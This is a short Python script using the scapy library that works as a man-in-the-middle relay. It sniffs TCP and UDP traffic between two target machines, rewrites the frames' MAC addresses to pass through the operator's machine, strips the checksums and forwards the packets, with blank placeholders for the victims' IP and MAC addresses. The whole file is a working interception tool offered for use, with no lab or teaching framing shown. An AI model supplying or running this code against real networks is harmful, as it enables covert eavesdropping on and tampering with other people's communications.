from scapy.all import *

IP_A="" # IP MACHINE A 
IP_B="" # IP MACHINE B
MAC_A='' #MAC ADDRESS MACHINE A (use command ($arp) tp find)
MAC_B='' #MAC ADDRESS MACHINE B
MAC_M='' #YOUR MACHINE MAC ADDRESS
NET_INTERFACE='' #YOUR NETWORK INTERFACE ID ($ip r)


def send_pkt(pkt):
  if(pkt.src==MAC_M):
    return
  else:
    try:
      if(pkt[IP].src==IP_A and pkt[IP].dst==IP_B):
        pkt.src=MAC_M
        pkt.dst=MAC_B
      elif(pkt[IP].src==IP_B and pkt[IP].dst==IP_A):
        pkt.src=MAC_M
        pkt.dst=MAC_A
      del(pkt.chksum)
      del(pkt[TCP].chksum)
      sendp(pkt, iface=NET_INTERFACE, realtime=True, verbose=False)
    except Exception as e:
      sendp(pkt, iface=NET_INTERFACE, verbose=False)

def capture_pkt_stream():
  sniff(filter="host "+IP_A+" and host "+IP_B+" and tcp or udp", iface=NET_INTERFACE, prn=send_pkt)


if __name__ == "__main__":
  capture_pkt_stream()